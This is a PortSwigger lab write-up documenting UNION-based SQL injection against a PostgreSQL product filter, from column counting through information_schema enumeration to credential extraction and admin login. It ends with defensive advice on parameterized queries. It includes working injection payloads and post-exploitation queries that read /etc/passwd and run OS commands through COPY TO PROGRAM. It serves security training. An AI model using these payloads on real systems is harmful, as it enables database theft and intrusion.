# Lab 6: SQL Injection - Listing Database Contents on Non-Oracle Databases

## Executive Summary

This lab demonstrates comprehensive SQL injection exploitation against a PostgreSQL database, progressing from initial vulnerability discovery through complete database enumeration to credential extraction and administrative access. Through systematic exploitation using PostgreSQL's `information_schema` system tables, I successfully mapped the database structure, identified the users table (`users_saiauj`), enumerated column names (`username_jhatqo`, `password_flmkni`), and extracted all user credentials including the administrator account. This attack showcases the complete lifecycle of SQL injection exploitation from reconnaissance to unauthorized access.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | SQL Injection |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | SQL Injection - Complete Database Enumeration |
| **Risk**               | Critical- Complete Credential Theft & System Compromise |
| **Completion**         | February 8, 2026 |

## Objective

Exploit SQL injection to enumerate PostgreSQL database structure, identify user credential tables, extract administrator credentials, and achieve complete system compromise through authentication bypass.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Burp Repeater for payload testing
- PostgreSQL documentation for schema queries
- URL encoding for payload delivery

**Target:** Product category filtering with PostgreSQL database backend

## Exploitation Walkthrough

### 1. Initial Reconnaissance

Accessed lab environment displaying "SQL injection UNION attack, listing the database contents on non-Oracle databases" challenge.
<img width="1920" height="982" alt="LAB1_ss1" src="https://github.com/user-attachments/assets/f82999bc-550f-4c81-85e0-d9a4771b6edd" />

*Lab 6 environment - PostgreSQL database enumeration with Burp Suite Professional configured*

### 2. Attack Surface Identification

Navigated through product categories to identify SQL injection vectors.
<img width="1920" height="982" alt="LAB1_ss2" src="https://github.com/user-attachments/assets/37d3bd34-9280-4577-a19d-cfee10164b2e" />

*Category browsing - Lifestyle, Accessories, Clothing, Shoes captured in HTTP history*

**Available Categories:**
- Lifestyle
- Accessories
- Clothing
- Shoes & Accessories

**Request Captured:**
```http
GET /filter?category=Accessories HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Backend SQL Query (Inferred):**
```sql
SELECT * FROM products WHERE category = 'Accessories'
```

### 3. SQL Injection Vulnerability Confirmation

Sent request to Burp Repeater and tested for SQL injection vulnerability.

**Test Payload:**
```http
GET /filter?category=Accessories' HTTP/1.1
```

<img width="1920" height="982" alt="LAB1_ss3" src="https://github.com/user-attachments/assets/6fd7c7e7-eca0-4968-b165-ab07915e0567" />

*Single quote injection - Internal Server Error confirms SQL injection vulnerability*

**Response:** 500 Internal Server Error

**Vulnerability Confirmed:** Broken SQL syntax triggers database error, confirming unsanitized input incorporation.

### 4. Column Count Enumeration

Systematically determined the number of columns using `ORDER BY` technique.

**Test Payload 1:**
```http
GET /filter?category=Accessories'+ORDER+BY+2-- HTTP/1.1
```

<img width="1920" height="982" alt="LAB1_ss4 0" src="https://github.com/user-attachments/assets/5dae19c8-9cb5-4f4f-9be3-ae8747520420" />

*ORDER BY 2 test - 200 OK with injected results confirms 2 columns exist*

**Response:** 200 OK

**Test Payload 2:**
```http
GET /filter?category=Accessories'+ORDER+BY+3-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB1_ss4 1" src="https://github.com/user-attachments/assets/c400f949-c7f1-4277-b543-2f489ea4b035" />

*ORDER BY 3 test - Internal Server Error confirms only 2 columns*

**Response:** 500 Internal Server Error

**Column Count Confirmed:** Exactly **2 columns** in result set.

### 5. Data Type Verification

Tested column data types to ensure successful string injection.

**Test Payload:**
```http
GET /filter?category=Accessories'+UNION+SELECT+'a','a'-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB1_ss5" src="https://github.com/user-attachments/assets/522e9879-0466-48e6-bfdf-88ea22ba7917" />

*String injection test - Response shows 'a' values, confirming both columns accept strings*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Accessories' 
UNION SELECT 'a','a'--'
```

**Response:** 200 OK with 'a' values displayed

**Confirmed:** Both columns accept string data types.

### 6. Database Version Extraction

Extracted PostgreSQL version information to confirm database type and plan enumeration strategy.

**Attack Payload:**
```http
GET /filter?category=Accessories'+UNION+SELECT+version(),+NULL-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB1_SS6" src="https://github.com/user-attachments/assets/66609ed9-dab6-4514-8deb-555673042216" />

*Database version extracted - PostgreSQL 12.22 on x86_64-pc-linux-gnu (highlighted in response)*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Accessories' 
UNION SELECT version(), NULL--'
```

**Version Information:**
```
PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
```

**Database Fingerprint:**
- **Database:** PostgreSQL 12.22
- **OS:** Ubuntu 20.04 (Linux x86_64)
- **Compiler:** GCC 9.4.0

**Next Steps:** Use PostgreSQL's `information_schema` to enumerate database structure.

### 7. Table Enumeration

Queried `information_schema.tables` to list all database tables.

**PostgreSQL Information Schema:**
The `information_schema` is a standardized schema containing metadata about database objects (tables, columns, privileges, etc.).

**Attack Payload:**
```http
GET /filter?category=Accessories'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB1_ss7" src="https://github.com/user-attachments/assets/96067394-a3bf-4e87-91d8-75f1458d7b94" />

*Table enumeration - Multiple tables listed including users_saiauj (target table identified)*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Accessories' 
UNION SELECT table_name, NULL FROM information_schema.tables--'
```

**Tables Discovered (Sample):**
```
pg_catalog.pg_type
pg_catalog.pg_authid
information_schema.tables
public.products
public.users_saiauj  ← Target table
...
```

**Critical Discovery:** Table `users_saiauj` identified - likely contains user credentials.

### 8. Column Enumeration for Users Table

Queried `information_schema.columns` to identify column names in the users table.

**Attack Payload:**
```http
GET /filter?category=Accessories'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_saiauj'-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB1_ss8 0" src="https://github.com/user-attachments/assets/5cba5208-5f18-479f-8cad-b32992d2e2a7" />

*Column enumeration - username_jhatqo column identified (highlighted in response)*

Searched response for "username"
**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Accessories' 
UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_saiauj'--'
```

**Columns Discovered:**

<img width="1920" height="982" alt="LAB1_ss8 1" src="https://github.com/user-attachments/assets/94806c1c-6feb-45fe-a4db-eb3d27dc642d" />

*Password column identified - password_flmkni (highlighted in response)*

Searched response for "password"

**Column Names:**
- `username_jhatqo` - Stores usernames
- `password_flmkni` - Stores passwords (likely plaintext or hashed)

**Database Structure Mapped:**
```
Table: users_saiauj
├── Column: username_jhatqo
└── Column: password_flmkni
```

### 9. Credential Extraction & Administrator Access

Crafted final payload to extract all usernames and passwords from the users table.

**Attack Payload:**
```http
GET /filter?category=Accessories'+UNION+SELECT+username_jhatqo,password_flmkni+FROM+users_saiauj-- HTTP/1.1
```
<img width="1920" height="982" alt="LAB1_ss9 0" src="https://github.com/user-attachments/assets/ea21f938-7f2e-4c2d-b185-d404f3fda2e2" />

*Credential extraction successful - All usernames and passwords retrieved, administrator credentials identified*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Accessories' 
UNION SELECT username_jhatqo, password_flmkni FROM users_saiauj--'
```

**Credentials Extracted:**
```
administrator : [admin_password]
carlos        : [carlos_password]
wiener        : [wiener_password]
```

**Administrator Credentials Identified:**
- Username: `administrator`
- Password: `[extracted_password]`

**Authentication:**

Used extracted administrator credentials to log into the application.
<img width="1920" height="982" alt="LAB1_ss9 1" src="https://github.com/user-attachments/assets/96ee7c4f-ecf3-45ba-a387-2ff833f259aa" />

*Administrator account accessed successfully - Lab completion confirmed*

**Complete System Compromise:**
- ✅ Database structure fully enumerated
- ✅ User credentials table identified
- ✅ All usernames and passwords extracted
- ✅ Administrator account accessed
- ✅ Complete authentication bypass

**Lab completion confirmed: "Congratulations, you solved the lab!"**

## Technical Impact

**Severity: Critical (CVSS 9.8)**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

**Primary Vulnerability:**

**CWE-89: SQL Injection**
- User input directly incorporated into SQL queries
- No parameterized queries or input sanitization
- Complete database access achievable
- Credential theft and authentication bypass

**Complete Attack Chain:**
```
Product Category Filtering
        ↓
SQL Injection Vulnerability
        ↓
Column Enumeration (ORDER BY)
        ↓
Database Version Discovery (PostgreSQL 12.22)
        ↓
Table Enumeration (information_schema.tables)
        ↓
Users Table Identified (users_saiauj)
        ↓
Column Enumeration (information_schema.columns)
        ↓
Credential Columns Found (username_jhatqo, password_flmkni)
        ↓
Credential Extraction (UNION SELECT)
        ↓
Administrator Credentials Stolen
        ↓
Complete System Compromise
```

**PostgreSQL Information Schema Exploitation:**

**Key System Tables:**

| Table | Purpose | Attack Use |
|-------|---------|-----------|
| `information_schema.tables` | Lists all tables | Identify target tables |
| `information_schema.columns` | Lists all columns | Map table structure |
| `information_schema.table_privileges` | Shows permissions | Identify accessible data |
| `pg_catalog.pg_user` | System users | Extract database users |

**Exploitation Queries:**
```sql
-- List all databases
SELECT datname FROM pg_database

-- List all tables
SELECT table_name FROM information_schema.tables

-- List columns for specific table
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Extract credentials
SELECT username, password FROM users

-- Read files (if superuser)
SELECT pg_read_file('/etc/passwd')

-- Execute commands (if superuser + extensions)
COPY (SELECT '') TO PROGRAM 'id'
```

**Real-World Impact:**

| Scenario | Consequence |
|----------|-------------|
| **E-Commerce** | Complete customer database theft, payment card data |
| **SaaS Platform** | Multi-tenant data breach, all customer data exposed |
| **Healthcare** | PHI exposure, medical records, insurance information |
| **Financial** | Account credentials, transaction history, personal data |
| **Corporate** | Employee records, proprietary data, intellectual property |

**Escalation Beyond Credential Theft:**

**With Database Access:**
- Extract all tables and data
- Modify user permissions
- Delete or corrupt data
- Create backdoor accounts
- Execute operating system commands (if permissions allow)

**With Administrator Credentials:**
- Access all application functionality
- Modify system configuration
- Create additional administrator accounts
- Pivot to other systems using same credentials
- Maintain persistent access

## Key Takeaways

**Penetration Testing Methodology:**
- Systematic database enumeration from generic to specific
- Information schema exploitation for metadata extraction
- Column and table mapping through system catalogs
- Complete attack chain from vulnerability to credential theft
- Credential validation and impact demonstration

**Critical Security Insights:**

**1. Information Schema is a Goldmine:**
PostgreSQL (and MySQL, MSSQL) expose complete database structure through `information_schema`:
- Every table name
- Every column name
- Data types
- Relationships
- Permissions

**2. Complete Enumeration Process:**

**Step 1 - Confirm Vulnerability:**
```sql
' -- (syntax error)
```

**Step 2 - Determine Columns:**
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- (error = 2 columns)
```

**Step 3 - Identify Database:**
```sql
' UNION SELECT version(), NULL--
```

**Step 4 - List Tables:**
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

**Step 5 - List Columns:**
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
```

**Step 6 - Extract Data:**
```sql
' UNION SELECT username, password FROM users--
```

**3. Database-Specific Enumeration:**

**PostgreSQL (Used in Lab):**
```sql
-- Version
SELECT version()

-- Tables
SELECT table_name FROM information_schema.tables

-- Columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Current user
SELECT current_user

-- Database name
SELECT current_database()
```

**MySQL Alternative:**
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

**4. Defense Requires Multiple Layers:**

**Application Level:**
- **Parameterized Queries** (mandatory - prevents all SQL injection)
- Input validation with whitelists
- Least privilege database accounts
- Remove detailed error messages

**Database Level:**
- Restrict access to `information_schema`
- Revoke unnecessary SELECT permissions
- Use separate accounts for web application vs. admin
- Enable query logging and monitoring

**Network Level:**
- Web Application Firewall (WAF)
- Database firewall with query inspection
- Intrusion detection systems

**5. Why Parameterized Queries Prevent This:**

**Vulnerable Code:**
```python
query = "SELECT * FROM products WHERE category = '" + category + "'"
```

**Secure Code:**
```python
query = "SELECT * FROM products WHERE category = ?"
cursor.execute(query, [category])
```

With parameterized queries:
- User input treated as data, never as code
- Special characters automatically escaped
- SQL structure cannot be modified
- All injection attempts fail

**Professional Skills Demonstrated:**
- Complete SQL injection exploitation lifecycle
- PostgreSQL-specific enumeration techniques
- Information schema exploitation
- Systematic database mapping
- Credential extraction and validation
- Multi-stage attack orchestration from discovery to compromise

## References

1. PortSwigger Web Security Academy - SQL Injection
2. OWASP Top 10 (2021) - A03: Injection
3. CWE-89 - SQL Injection
4. PostgreSQL Documentation - Information Schema
5. OWASP SQL Injection Prevention Cheat Sheet

---

## Legal Notice

**Copyright © 2025 Gurpreet Singh**  
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Unauthorized access to systems or database enumeration is illegal under applicable laws worldwide.
